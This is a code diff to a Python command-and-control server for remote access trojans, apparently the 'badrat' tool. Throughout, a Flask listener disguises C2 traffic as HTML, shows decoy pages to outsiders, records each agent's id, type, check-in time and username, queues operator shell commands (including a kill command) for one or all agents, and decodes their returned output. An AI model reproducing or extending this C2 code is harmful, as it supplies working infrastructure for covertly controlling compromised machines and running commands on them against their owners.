@@ -15,18 +15,20 @@ ENDC = '\033[0m'
 UNDERLINE = '\033[4m'
 
 port=8080
+# I should probably make a dict of dicts...
 commands = {}
 rats = {}
 types = {}
+usernames = {}
 
-#Wrap C2 comms in html and html2 code to make requests look more legitimate
+# Wrap C2 comms in html and html2 code to make requests look more legitimate
 def htmlify(data):
     html = "<html><head><title>http server</title></head>\n"
     html += "<body>\n"
     html += "<b>\n"
     html2 = "</b>\n"
     html2 = "</body></html>\n"
-    return(html + data + html2)
+    return(html + data + "\n" + html2)
 
 # Page sent to "unauthorized" users of the http listener
 def default_page():
@@ -47,9 +49,13 @@ def colors(value):
     elif(value in types.keys()):
         return(colors[types[value]] + value + ENDC)
     elif(value == "all"):
-        return(UNDERLINE + BOLD + "ALL RATS" + ENDC)
+        return(BOLD + "ALL RATS" + ENDC)
+    elif(value == ">>"):
+        return( BOLD + c + ">" + js + ">" + ENDC)
+    elif(value == "commit Seppuku"):
+        return(c + value + ENDC)
     else:
-        return("[!] Something wrong with colors")
+        return(UNDERLINE + value + ENDC)
 
 def serve_server(port=8080):
     app = Flask(__name__)
@@ -74,32 +80,37 @@ def serve_server(port=8080):
         try:
             ratID = str(post_dict['id'])
             ratType = str(post_dict['type'])
+            username = str(post_dict['un'])
         except:
-            print("[!] Post request against listener with no \"id\" or \"type\" parameter")
+            print("[!] Failed to grab id, type, or user param from post request")
             return(default_page())
 
         # Update checkin time for an agent every checkin
         checkin = time.strftime("%H:%M:%S", time.localtime())
         rats[ratID] = checkin
         types[ratID] = ratType
+        usernames[ratID] = username
 
         # If there is no current command for a rat, create a blank one
         if not ratID in commands:
             commands[ratID] = ""
 
         if("retval" in post_dict.keys()):
-            print("\nResults from rat " + str(post_dict['id']) + "\n")
+            print("\nResults from rat " + colors(str(post_dict['id'])) + "\n")
             print(base64.b64decode(post_dict['retval']).decode('utf-8'))
 
-        return(htmlify(json.dumps({"cmnd": commands[ratID]}) + "\n"))
+        return(htmlify(json.dumps({"cmnd": commands[ratID]})))
 
     app.run(host="0.0.0.0", port=port)
 
-def get_rats():
-    print("\nrat ID\t\ttype\tcheck-in")
-    print("--------\t----\t--------")
+def get_rats(current=""):
+    print("\n    agent id\ttype\tcheck-in\tusername")
+    print("    --------\t----\t--------\t--------")
     for ratID, checkin in rats.items():
-        print(ratID + "    \t" + colors(types[ratID]) + "  \t" + checkin)
+        if(current == ratID or current == "all"):
+            print(" "+colors(">>")+" "+ratID+"   \t"+colors(types[ratID])+"  \t"+checkin+" \t"+usernames[ratID])
+        else:
+            print("    "+ratID+"   \t"+colors(types[ratID])+"  \t"+checkin+" \t"+usernames[ratID])
     print("")
 
 def remove_rat(ratID):
@@ -191,16 +202,16 @@ while True:
             if(inp == "back" or inp == "exit"):
                 break
             elif(inp == "agents" or inp == "rats" or inp == "checkins" or inp == "sessions"):
-                get_rats()
+                get_rats(ratID)
             elif(inp == "clear"):
                 os.system("clear")
             elif(inp.startswith("cd ")):
               print("[!] Full paths only! No cd in badrat")
             elif(inp):
                 if(inp == "kill"):
-                    print("[*] Tasked rat " + ratID + " to " + RED + "commit Seppuku" + ENDC)
+                    print("[*] Tasked " + colors(ratID) + " to " + colors("commit Seppuku"))
                 else:
-                    print("[*] Queued command " + UNDERLINE + inp + ENDC + " for " + colors(ratID))
+                    print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
                 if(ratID == "all"):
                     # update ALL commands
                     for i in commands.keys():
